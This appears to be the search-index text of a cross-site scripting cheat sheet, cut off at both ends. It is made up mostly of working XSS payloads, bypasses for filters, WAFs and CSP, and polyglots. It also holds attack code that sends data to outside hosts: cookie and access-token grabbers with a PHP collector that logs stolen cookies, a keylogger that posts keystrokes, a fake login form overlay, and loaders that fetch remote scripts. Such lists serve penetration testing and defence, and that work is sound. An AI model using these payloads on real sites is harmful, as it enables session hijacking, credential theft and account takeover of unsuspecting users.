+(\ud808\ude7a.\ud808\udc03+\ud808\uddfa)[\ud808\udc00]+\ud808\udc03[\ud808\udc06]+\ud808\udf10+\ud808\udc1f+\ud808\ude7a[\ud808\ude2b]+\ud808\udc79+\ud808\udf10+\ud808\uddfa[\ud808\udc00] +\ud808\udc1f][\ud808\udc79](\ud808\udc03[\ud808\udc00]+\ud808\udc03[\ud808\ude2b]+\ud808\ude7a[\ud808\udc06]+\ud808\udc1f+\ud808\udf10+\"(\ud808\udc00)\")() Bypass using Lontara \u1a06='',\u1a0a=!\u1a06+\u1a06,\u1a0e=!\u1a0a+\u1a06,\u1a02=\u1a06+{},\u1a07=\u1a0a[\u1a06++],\u1a0b=\u1a0a[\u1a0f=\u1a06],\u1a03=++\u1a0f+\u1a06,\u1a05=\u1a02[\u1a0f+\u1a03],\u1a0a[\u1a05+=\u1a02[\u1a06]+(\u1a0a.\u1a0e+\u1a02)[\u1a06]+\u1a0e[\u1a03]+\u1a07+\u1a0b+\u1a0a[\u1a0f]+\u1a05+\u1a07+\u1a02[\u1a06]+\u1a0b][\u1a05](\u1a0e[\u1a06]+\u1a0e[\u1a0f]+\u1a0a[\u1a03]+\u1a0b+\u1a07+\"(\u1a06)\")() More alphabets on http://aem1k.com/aurebesh.js/# Bypass using ECMAScript6 <script>alert&DiacriticalGrave;1&DiacriticalGrave;</script> Bypass using Octal encoding javascript:'\\74\\163\\166\\147\\40\\157\\156\\154\\157\\141\\144\\75\\141\\154\\145\\162\\164\\50\\61\\51\\76' Bypass using Unicode Unicode character U+FF1C FULLWIDTH LESS\u00adTHAN SIGN (encoded as %EF%BC%9C) was transformed into U+003C LESS\u00adTHAN SIGN (<) Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was transformed into U+0022 QUOTATION MARK (\") Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was transformed into U+0027 APOSTROPHE (') E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/ %EF%BC%9E becomes > %EF%BC%9C becomes < Bypass using Unicode converted to uppercase \u0130 (%c4%b0).toLowerCase() => i \u0131 (%c4%b1).toUpperCase() => I \u017f (%c5%bf) .toUpperCase() => S \u212a (%E2%84%AA).toLowerCase() => k <\u017fvg onload=... > become <SVG ONLOAD=...> <\u0131frame id=x onload=>.toUpperCase() become <IFRAME ID=X ONLOAD=> Bypass using UTF-7 +ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4- Bypass using UTF-8 < = %C0%BC = %E0%80%BC = %F0%80%80%BC > = %C0%BE = %E0%80%BE = %F0%80%80%BE ' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7 \" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2 \" = %CA%BA ' = %CA%B9 Bypass using UTF-16be %00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00 \\x00<\\x00s\\x00v\\x00g\\x00/\\x00o\\x00n\\x00l\\x00o\\x00a\\x00d\\x00=\\x00a\\x00l\\x00e\\x00r\\x00t\\x00(\\x00)\\x00> Bypass using UTF-32 %00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E Bypass using BOM Byte Order Mark (The page must begin with the BOM character.) BOM character allows you to override charset of the page BOM Character for UTF-16 Encoding: Big Endian : 0xFE 0xFF Little Endian : 0xFF 0xFE XSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E BOM Character for UTF-32 Encoding: Big Endian : 0x00 0x00 0xFE 0xFF Little Endian : 0xFF 0xFE 0x00 0x00 XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E Bypass using weird encoding or native interpretation <script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script> <img src=\"1\" onerror=\"&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;\" /> <iframe src=\"javascript:%61%6c%65%72%74%28%31%29\"></iframe> <script>$=~[];$={___:++$,$$$$:(![]+\"\")[$],__$:++$,$_$_:(![]+\"\")[$],_$_:++$,$_$$:({}+\"\")[$],$$_$:($[$]+\"\")[$],_$$:++$,$$$_:(!\"\"+\"\")[$],$__:++$,$_$:++$,$$__:({}+\"\")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+\"\")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+\"\")[$.__$])+((!$)+\"\")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!\"\"+\"\")[$.__$])+($._=(!\"\"+\"\")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!\"\"+\"\")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+\"\\\"\"+$.$_$_+(![]+\"\")[$._$_]+$.$$$_+\"\\\\\"+$.__$+$.$$_+$._$_+$.__+\"(\"+$.___+\")\"+\"\\\"\")())();</script> <scriptscript> Bypass using jsfuck Bypass using jsfuckypass Check the CSP on https://csp-evaluator.withgoogle.com and the post : How to use Google\u2019s CSP Evaluator to bypass CSP Bypass CSP using JSONP from Google (Trick by @apfeifer27 ) //google.com/complete/search?client=chrome&jsonp=alert(1); <script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>\" More JSONP endpoints: * /Intruders/jsonp_endpoint.txt * JSONBee/jsonp.txt Bypass CSP by lab.wallarm.com Works for CSP like Content-Security-Policy: default-src 'self' 'unsafe-inline'; , POC here script=document.createElement('script'); script.src='//bo0om.ru/csp.js'; window.frames[0].document.head.appendChild(script); Bypass CSP by Rhynorater // CSP Bypass with Inline and Eval d=document;f=d.createElement(\"iframe\");f.src=d.querySelector('link[href*=\".css\"]').href;d.body.append(f);s=d.createElement(\"script\");s.src=\"https://[YOUR_XSSHUNTER_USERNAME].xss.ht\";setTimeout(function(){f.contentWindow.document.head.append(s);},1000) Bypass CSP by @akita_zen Works for CSP like script-src self <object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object> Bypass CSP by @404death Works for CSP like script-src 'self' data: as warned about in the official mozilla documentation . <script src=\"data:,alert(1)\">/</script> Common WAF Bypass Cloudflare XSS Bypasses by @Bohdan Korzhynskyi 25st January 2021 <svg/onrandom=random onload=confirm(1)> <video onnull=null onmouseover=confirm(1)> 21st April 2020 <svg/OnLoad=\"`${prompt``}`\"> 22nd August 2019 <svg/onload=%26nbsp;alert`bohdan`+ 5th June 2019 1'\"><img/src/onerror=.1|alert``> 3rd June 2019 <svg onload=prompt%26%230000000040document.domain)> <svg onload=prompt%26%23x000000028;document.domain)> xss'\"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'> Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10) <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f Cloudflare XSS Bypass - 27th February 2018 <a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;\">X</a> Chrome Auditor - 9th August 2018 </script><svg><script>alert(1)-%26apos%3B Live example by @brutelogic - https://brutelogic.com.br/xss.php Incapsula WAF Bypass by @Alra3ees - 8th March 2018 anythinglr00</script><script>alert(document.domain)</script>uxldz anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz Incapsula WAF Bypass by @c0d3G33k - 11th September 2018 <object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object> Incapsula WAF Bypass by @daveysec - 11th May 2019 <svg onload\\r\\n=$.globalEval(\"al\"+\"ert()\");> Akamai WAF Bypass by @zseano - 18th June 2018 ?\"></script><base%20c%3D=href%3Dhttps:\\mysite> Akamai WAF Bypass by @s0md3v - 28th October 2018 <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x> WordFence WAF Bypass by @brutelogic - 12th September 2018 <a href=javas&#99;ript:alert(1)> Fortiweb WAF Bypass by @rezaduty - 9th July 2019 \\u003e\\u003c\\u0068\\u0031 onclick=alert('1')\\u003e References Unleashing-an-Ultimate-XSS-Polyglot tbm (Relative Path Overwrite) RPO XSS - Infinite Security RPO TheSpanner RPO Gadget - innerthmtl Relative Path Overwrite - Detectify XSS ghettoBypass - d3adend XSS without HTML: Client-Side Template Injection with AngularJS XSSING WEB PART - 2 - Rakesh Mane Making an XSS triggered by CSP bypass on Twitter. @tbmnull Ways to alert(document.domain) - @tomnomnom D1T1 - Michele Spagnuolo and Lukas Wilschelbaum - So We Broke All CSPs Sleeping stored Google XSS Awakens a $5000 Bounty by Patrik Fehrenbach RPO that lead to information leakage in Google by filedescriptor God-like XSS, Log-in, Log-out, Log-in in Uber by Jack Whitton Three Stored XSS in Facebook by Nirgoldshlager Using a Braun Shaver to Bypass XSS Audit and WAF by Frans Rosen An XSS on Facebook via PNGs & Wonky Content Types by Jack Whitton Stored XSS in *.ebay.com by Jack Whitton Complicated, Best Report of Google XSS by Ramzes Tricky Html Injection and Possible XSS in sms-be-vip.twitter.com by secgeek Command Injection in Google Console by Venkat S Facebook's Moves - OAuth XSS by PAULOS YIBELO Stored XSS in Google Docs (Bug Bounty) by Harry M Gertos Stored XSS on developer.uber.com via admin account compromise in Uber by James Kettle (albinowax) Yahoo Mail stored XSS by Klikki Oy Abusing XSS Filter: One ^ leads to XSS(CVE-2016-3212) by Masato Kinugawa Youtube XSS by fransrosen Best Google XSS again - by Krzysztof Kotowicz IE & Edge URL parsing Problem - by detectify Google XSS subdomain Clickjacking Microsoft XSS and Twitter XSS Google Japan Book XSS Flash XSS mega nz - by frans Flash XSS in multiple libraries - by Olivier Beg xss in google IE, Host Header Reflection Years ago Google xss xss in google by IE weird behavior xss in Yahoo Fantasy Sport xss in Yahoo Mail Again, worth $10000 by Klikki Oy Sleeping XSS in Google by securityguard Decoding a .htpasswd to earn a payload of money by securityguard Google Account Takeover AirBnb Bug Bounty: Turning Self-XSS into Good-XSS #2 by geekboy Uber Self XSS to Global XSS How I found a $5,000 Google Maps XSS (by fiddling with Protobuf) by Marin MoulinierFollow Airbnb \u2013 When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities by Brett XSSI, Client Side Brute Force postMessage XSS on a million sites - December 15, 2016 - Mathias Karlsson postMessage XSS Bypass XSS in Uber via Cookie by zhchbin Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP by frans XSS due to improper regex in third party js Uber 7k XSS XSS in TinyMCE 2.4.0 by Jelmer de Hen Pass uncoded URL in IE11 to cause XSS Twitter XSS by stopping redirection and javascript scheme by Sergey Bobrov Auth DOM Uber XSS Managed Apps and Music: two Google reflected XSSes App Maker and Colaboratory: two Google stored XSSes XSS in www.yahoo.com Stored XSS, and SSRF in Google using the Dataset Publishing Language Stored XSS on Snapchat XSS cheat sheet - PortSwigger mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, J\u00f6rg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang Self Closing Script Bypass < with \uff1c Bypassing Signature-Based XSS Filters: Modifying Script Code","title":"Cross Site Scripting"},{"location":"XSS%20Injection/#cross-site-scripting","text":"Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.","title":"Cross Site Scripting"},{"location":"XSS%20Injection/#summary","text":"Cross Site Scripting Summary Exploit code or POC Data grabber for XSS CORS UI redressing Javascript keylogger Other ways Identify an XSS endpoint Tools XSS in HTML/Applications Common Payloads XSS using HTML5 tags XSS using a remote JS XSS in hidden input XSS when payload is reflected capitalized DOM based XSS XSS in JS Context XSS in wrappers javascript and data URI XSS in files XSS in XML XSS in SVG XSS in SVG (short) XSS in Markdown XSS in SWF flash application XSS in SWF flash application XSS in CSS XSS in PostMessage Blind XSS XSS Hunter Other Blind XSS tools Blind XSS endpoint Tips Mutated XSS Polyglot XSS Filter Bypass and exotic payloads Bypass case sensitive Bypass tag blacklist Bypass word blacklist with code evaluation Bypass with incomplete html tag Bypass quotes for string Bypass quotes in script tag Bypass quotes in mousedown event Bypass dot filter Bypass parenthesis for string Bypass parenthesis and semi colon Bypass onxxxx= blacklist Bypass space filter Bypass email filter Bypass document blacklist Bypass using javascript inside a string Bypass using an alternate way to redirect Bypass using an alternate way to execute an alert Bypass \">\" using nothing Bypass \"<\" and \">\" using \uff1c and \uff1e Bypass \";\" using another character Bypass using HTML encoding Bypass using Katana Bypass using Cuneiform Bypass using Lontara Bypass using ECMAScript6 Bypass using Octal encoding Bypass using Unicode Bypass using UTF-7 Bypass using UTF-8 Bypass using UTF-16be Bypass using UTF-32 Bypass using BOM Bypass using weird encoding or native interpretation Bypass using jsfuck CSP Bypass Bypass CSP using JSONP from Google (Trick by @apfeifer27) Bypass CSP by lab.wallarm.com Bypass CSP by Rhynorater Bypass CSP by @akita_zen Bypass CSP by @404death Common WAF Bypass Cloudflare XSS Bypasses by @Bohdan Korzhynskyi 25st January 2021 21st April 2020 22nd August 2019 5th June 2019 3rd June 2019 Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10) Cloudflare XSS Bypass - 27th February 2018 Chrome Auditor - 9th August 2018 Incapsula WAF Bypass by @Alra3ees- 8th March 2018 Incapsula WAF Bypass by @c0d3G33k - 11th September 2018 Incapsula WAF Bypass by @daveysec - 11th May 2019 Akamai WAF Bypass by @zseano - 18th June 2018 Akamai WAF Bypass by @s0md3v - 28th October 2018 WordFence WAF Bypass by @brutelogic - 12th September 2018 Fortiweb WAF Bypass by @rezaduty - 9th July 2019 References","title":"Summary"},{"location":"XSS%20Injection/#exploit-code-or-poc","text":"","title":"Exploit code or POC"},{"location":"XSS%20Injection/#data-grabber-for-xss","text":"Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page. <script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script> <script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script> <script>new Image().src=\"http://localhost/cookie.php?c=\"+document.cookie;</script> <script>new Image().src=\"http://localhost/cookie.php?c=\"+localStorage.getItem('access_token');</script> Write the collected data into a file. <?php $cookie = $_GET['c']; $fp = fopen('cookies.txt', 'a+'); fwrite($fp, 'Cookie:' .$cookie.\"\\r\\n\"); fclose($fp); ?>","title":"Data grabber for XSS"},{"location":"XSS%20Injection/#cors","text":"<script> fetch('https://<SESSION>.burpcollaborator.net', { method: 'POST', mode: 'no-cors', body: document.cookie }); </script>","title":"CORS"},{"location":"XSS%20Injection/#ui-redressing","text":"Leverage the XSS to modify the HTML content of the page in order to display a fake login form. <script> history.replaceState(null, null, '../../../login'); document.body.innerHTML = \"</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>\" </script>","title":"UI redressing"},{"location":"XSS%20Injection/#javascript-keylogger","text":"Another way to collect sensitive data is to set a javascript keylogger. <img src=x onerror='document.onkeypress=function(e){fetch(\"http://domain.com?k=\"+String.fromCharCode(e.which))},this.remove();'>","title":"Javascript keylogger"},{"location":"XSS%20Injection/#other-ways","text":"More exploits at http://www.xss-payloads.com/payloads-list.html?a#category=all : Taking screenshots using XSS and the HTML5 Canvas JavaScript Port Scanner Network Scanner .NET Shell execution Redirect Form Play Music","title":"Other ways"},{"location":"XSS%20Injection/#identify-an-xss-endpoint","text":"This payload opens the debugger in the developer console rather than triggering a popup alert box. <script>debugger;</script> Modern applications with content hosting can use sandbox domains to safely host various types of user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML, JavaScript, or Flash applets and make sure that they can't access any user data. For this reason, it's better to use alert(document.domain) or alert(window.origin) rather than alert(1) as default XSS payload in order to know in which scope the XSS is actually executing. Better payload replacing <script>alert(1)</script> : <script>alert(document.domain.concat(\"\\n\").concat(window.origin))</script> While alert() is nice for reflected XSS it can quickly become a burden for stored XSS because it requires to close the popup for each execution, so console.log() can be used instead to display a message in the console of the developer console (doesn't require any interaction). Example: <script>console.log(\"Test XSS from the search bar of page XYZ\\n\".concat(document.domain).concat(\"\\n\").concat(window.origin))</script> References: Google Bughunter University - XSS in sandbox domains LiveOverflow Video - DO NOT USE alert(1) for XSS LiveOverflow blog post - DO NOT USE alert(1) for XSS","title":"Identify an XSS endpoint"},{"location":"XSS%20Injection/#tools","text":"Most tools are also suitable for blind XSS attacks: XSSStrike : Very popular but unfortunately not very well maintained xsser : Utilizes a headless browser to detect XSS vulnerabilities Dalfox : Extensive functionality and extremely fast thanks to the implementation in Go XSpear : Similar to Dalfox but based on Ruby domdig : Headless Chrome XSS Tester","title":"Tools"},{"location":"XSS%20Injection/#xss-in-htmlapplications","text":"","title":"XSS in HTML/Applications"},{"location":"XSS%20Injection/#common-payloads","text":"// Basic payload <script>alert('XSS')</script> <scr<script>ipt>alert('XSS')</scr<script>ipt> \"><script>alert('XSS')</script> \"><script>alert(String.fromCharCode(88,83,83))</script> <script>\\u0061lert('22')</script> <script>eval('\\x61lert(\\'33\\')')</script> <script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt(\"confirm\",30) == 8680439 && 8680439..toString(30) == \"confirm\" <object/data=\"jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;\"> // Img payload <img src=x onerror=alert('XSS');> <img src=x onerror=alert('XSS')// <img src=x onerror=alert(String.fromCharCode(88,83,83));> <img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));> <img src=x:alert(alt) onerror=eval(src) alt=xss> \"><img src=x onerror=alert('XSS');> \"><img src=x onerror=alert(String.fromCharCode(88,83,83));> // Svg payload <svg onload=alert(1)> <svg/onload=alert('XSS')> <svg onload=alert(1)// <svg/onload=alert(String.fromCharCode(88,83,83))> <svg id=alert(1) onload=eval(id)> \"><svg/onload=alert(String.fromCharCode(88,83,83))> \"><svg/onload=alert(/XSS/) <svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script) <svg><script>alert('33') <svg><script>alert&lpar;'33'&rpar; // Div payload <div onpointerover=\"alert(45)\">MOVE HERE</div> <div onpointerdown=\"alert(45)\">MOVE HERE</div> <div onpointerenter=\"alert(45)\">MOVE HERE</div> <div onpointerleave=\"alert(45)\">MOVE HERE</div> <div onpointermove=\"alert(45)\">MOVE HERE</div> <div onpointerout=\"alert(45)\">MOVE HERE</div> <div onpointerup=\"alert(45)\">MOVE HERE</div>","title":"Common Payloads"},{"location":"XSS%20Injection/#xss-using-html5-tags","text":"<body onload=alert(/XSS/.source)> <input autofocus onfocus=alert(1)> <select autofocus onfocus=alert(1)> <textarea autofocus onfocus=alert(1)> <keygen autofocus onfocus=alert(1)> <video/poster/onerror=alert(1)> <video><source onerror=\"javascript:alert(1)\"> <video src=_ onloadstart=\"alert(1)\"> <details/open/ontoggle=\"alert`1`\"> <audio src onloadstart=alert(1)> <marquee onstart=alert(1)> <meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter> <body ontouchstart=alert(1)> // Triggers when a finger touch the screen <body ontouchend=alert(1)> // Triggers when a finger is removed from touch screen <body ontouchmove=alert(1)> // When a finger is dragged across the screen.","title":"XSS using HTML5 tags"},{"location":"XSS%20Injection/#xss-using-a-remote-js","text":"<svg/onload='fetch(\"//host/a\").then(r=>r.text().then(t=>eval(t)))'> <script src=14.rs> // you can also specify an arbitrary payload with 14.rs/#payload e.g: 14.rs/#alert(document.domain)","title":"XSS using a remote JS"},{"location":"XSS%20Injection/#xss-in-hidden-input","text":"<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\"> Use CTRL+SHIFT+X to trigger the onclick event","title":"XSS in hidden input"},{"location":"XSS%20Injection/#xss-when-payload-is-reflected-capitalized","text":"<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>","title":"XSS when payload is reflected capitalized"},{"location":"XSS%20Injection/#dom-based-xss","text":"Based on a DOM XSS sink. #\"><img src=/ onerror=alert(2)>","title":"DOM based XSS"},{"location":"XSS%20Injection/#xss-in-js-context","text":"-(confirm)(document.domain)// ; alert(1);// // (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)","title":"XSS in JS Context"},{"location":"XSS%20Injection/#xss-in-wrappers-javascript-and-data-uri","text":"XSS with javascript: javascript:prompt(1) %26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341 &#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41 We can encode the \"javascript:\" in Hex/Octal \\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1) \\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1) \\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\072alert(1) We can use a 'newline character' java%0ascript:alert(1) - LF (\\n) java%09script:alert(1) - Horizontal tab (\\t) java%0dscript:alert(1) - CR (\\r) Using the escape character \\j\\av\\a\\s\\cr\\i\\pt\\:\\a\\l\\ert\\(1\\) Using the newline and a comment // javascript://%0Aalert(1) javascript://anything%0D%0A%0D%0Awindow.alert(1) XSS with data: data:text/html,<script>alert(0)</script> data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ <script src=\"data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"></script> XSS with vbscript: only IE vbscript:msgbox(\"XSS\")","title":"XSS in wrappers javascript and data URI"},{"location":"XSS%20Injection/#xss-in-files","text":"NOTE: The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup. <name> <value><![CDATA[<script>confirm(document.domain)</script>]]></value> </name>","title":"XSS in files"},{"location":"XSS%20Injection/#xss-in-xml","text":"<html> <head></head> <body> <something:script xmlns:something=\"http://www.w3.org/1999/xhtml\">alert(1)</something:script> </body> </html>","title":"XSS in XML"},{"location":"XSS%20Injection/#xss-in-svg","text":"<?xml version=\"1.0\" standalone=\"no\"?> <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"> <svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"> <polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/> <script type=\"text/javascript\"> alert(document.domain); </script> </svg>","title":"XSS in SVG"},{"location":"XSS%20Injection/#xss-in-svg-short","text":"<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/> <svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg> <svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg> <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>","title":"XSS in SVG (short)"},{"location":"XSS%20Injection/#xss-in-markdown","text":"[a](javascript:prompt(document.cookie)) [a](j a v a s c r i p t:prompt(document.cookie)) [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K) [a](javascript:window.onerror=alert;throw%201)","title":"XSS in Markdown"},{"location":"XSS%20Injection/#xss-in-swf-flash-application","text":"Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain); IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(\u2018?js=history.go(-1)\u2019,\u2019_self\u2019);} IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(\u2018invalidfileinvalidfileinvalidfile\u2019,\u2019target\u2019);setTimeout(\u2018alert(w.document.location);w.close();\u2019,1); more payloads in ./files","title":"XSS in SWF flash application"},{"location":"XSS%20Injection/#xss-in-swf-flash-application_1","text":"flashmediaelement.swf?jsinitfunctio%gn=alert`1` flashmediaelement.swf?jsinitfunctio%25gn=alert(1) ZeroClipboard.swf?id=\\\"))} catch(e) {alert(1);}//&width=1000&height=1000 swfupload.swf?movieName=\"]);}catch(e){}if(!self.a)self.a=!alert(1);// swfupload.swf?buttonText=test<a href=\"javascript:confirm(1)\"><img src=\"https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg\"/></a>&.swf plupload.flash.swf?%#target%g=alert&uid%g=XSS& moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true video-js.swf?readyFunction=alert(1) player.swf?playerready=alert(document.cookie) player.swf?tracecall=alert(document.cookie) banner.swf?clickTAG=javascript:alert(1);// io.swf?yid=\\\"));}catch(e){alert(1);}// video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29 bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4 flashcanvas.swf?id=test\\\"));}catch(e){alert(document.domain)}// phpmyadmin/js/canvg/flashcanvas.swf?id=test\\\u201d));}catch(e){alert(document.domain)}//","title":"XSS in SWF flash application"},{"location":"XSS%20Injection/#xss-in-css","text":"<!DOCTYPE html> <html> <head> <style> div { background-image: url(\"data:image/jpg;base64,<\\/style><svg/onload=alert(document.domain)>\"); background-color: #cccccc; } </style> </head> <body> <div>lol</div> </body> </html>","title":"XSS in CSS"},{"location":"XSS%20Injection/#xss-in-postmessage","text":"If the target origin is asterisk * the message can be sent to any domain has reference to the child page. <html> <body> <input type=button value=\"Click Me\" id=\"btn\"> </body> <script> document.getElementById('btn').onclick = function(e){ window.poc = window.open('http://www.redacted.com/#login'); setTimeout(function(){ window.poc.postMessage( { \"sender\": \"accounts\", \"url\": \"javascript:confirm('XSS')\", }, '*' ); }, 2000); } </script> </html>","title":"XSS in PostMessage"},{"location":"XSS%20Injection/#blind-xss","text":"","title":"Blind XSS"},{"location":"XSS%20Injection/#xss-hunter","text":"Available at https://xsshunter.com/app XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service. \"><script src=//yoursubdomain.xss.ht></script> javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://yoursubdomain.xss.ht\\';document.body.appendChild(a)') <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//yoursubdomain.xss.ht\");a.send();</script> <script>$.getScript(\"//yoursubdomain.xss.ht\")</script>","title":"XSS Hunter"},{"location":"XSS%20Injection/#other-blind-xss-tools","text":"sleepy-puppy - Netflix bXSS - LewisArdern ezXSS - ssl","title":"Other Blind XSS tools"},{"location":"XSS%20Injection/#blind-xss-endpoint","text":"Contact forms Ticket support Referer Header Custom Site Analytics Administrative Panel logs User Agent Custom Site Analytics Administrative Panel logs Comment Box Administrative Panel","title":"Blind XSS endpoint"},{"location":"XSS%20Injection/#tips","text":"You can use a Data grabber for XSS and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool. Eg. payload <script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script> Eg. one-line HTTP server: $ ruby -run -ehttpd . -p8080","title":"Tips"},{"location":"XSS%20Injection/#mutated-xss","text":"Use browsers quirks to recreate some HTML tags when it is inside an element.innerHTML . Mutated XSS from Masato Kinugawa, used against DOMPurify component on Google Search. Technical blogposts available at https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/ and https://research.securitum.com/dompurify-bypass-using-mxss/. <noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">","title":"Mutated XSS"},{"location":"XSS%20Injection/#polyglot-xss","text":"Polyglot XSS - 0xsobky jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e Polyglot XSS - Ashar Javed \">><marquee><img src=x onerror=confirm(1)></marquee>\" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\" ></script><script>alert(1)</script>\"><img/id=\"confirm&lpar; 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"http: //i.imgur.com/P8mL8.jpg\"> Polyglot XSS - Mathias Karlsson \" onclick=alert(1)//<button \u2018 onclick=alert(1)//> */ alert(1)// Polyglot XSS - Rsnake ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//\";alert(String.fromCharCode (88,83,83))//\";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT> Polyglot XSS - Daniel Miessler 